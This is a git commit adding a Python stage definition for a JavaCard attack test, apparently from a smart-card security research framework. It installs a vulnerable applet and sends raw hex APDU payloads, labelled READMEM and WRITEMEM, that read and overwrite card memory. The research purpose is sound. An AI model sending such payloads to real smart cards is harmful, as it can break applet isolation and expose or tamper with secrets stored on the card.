10c02ccc51b1d9959b2ade82ed71ec64a9e9b37e
quapka <quapka@gmail.com>
2020-06-16 22:05:59 +0200

    Add ArrayOps stages

---
+++ jsec/data/attacks/arrayops/arrayops.py
@@ -0,0 +1,56 @@
+class Stages:
+    STAGES = [
+        {
+            "name": "install",
+            "path": "build/{version}/com/se/vulns/javacard/vulns.new.cap",
+            "comment": "",
+        },
+        {
+            "name": "install",
+            "path": "build/{version}/com/se/applets/javacard/applets.cap",
+        },
+        {
+            "name": "send",
+            "comment": "READMEM APDU",
+            "payload": "0x80 0x10 0x01 0x02	0x04	0x00 0x00 0xc0 0x00				0x7F",
+            "optional": False,
+        },
+        {
+            "name": "send",
+            "comment": "WRITEMEM APDU",
+            "payload": "0x80 0x11 0x01 0x02	0x08	0x00 0x0a 0x04 0x00 0xaa 0xbb 0xcc 0xdd		0x7F",
+            "optional": False,
+        },
+        {
+            "name": "send",
+            "comment": "WRITEMEM APDU",
+            "payload": "0x80 0x11 0x01 0x02	0x08	0x00 0x0e 0x04 0x01 0x11 0x22 0x33 0x44		0x7F",
+            "optional": False,
+        },
+        {
+            "name": "send",
+            "comment": "WRITEMEM APDU",
+            "payload": "0x80 0x11 0x01 0x02	0x08	0x00 0x12 0x04 0x02 0x55 0x66 0x77 0x88		0x7F",
+            "optional": False,
+        },
+        {
+            "name": "send",
+            "comment": "WRITEMEM APDU",
+            "payload": "0x80 0x11 0x01 0x02	0x08	0x00 0x16 0x04 0x03 0x11 0x22 0x33 0x44		0x7F",
+            "optional": False,
+        },
+        {
+            "name": "send",
+            "comment": "READMEM APDU",
+            "payload": "0x80 0x10 0x01 0x02	0x04	0x00 0x00 0xc0 0x01				0x7F",
+            "optional": False,
+        },
+        # {
+        #     "name": "uninstall",
+        #     "path": "build/{version}/com/se/vulns/javacard/vulns.new.cap",
+        # },
+        # {
+        #     "name": "uninstall",
+        #     "path": "build/{version}/com/se/applets/javacard/applets.cap",
+        # },
+    ]
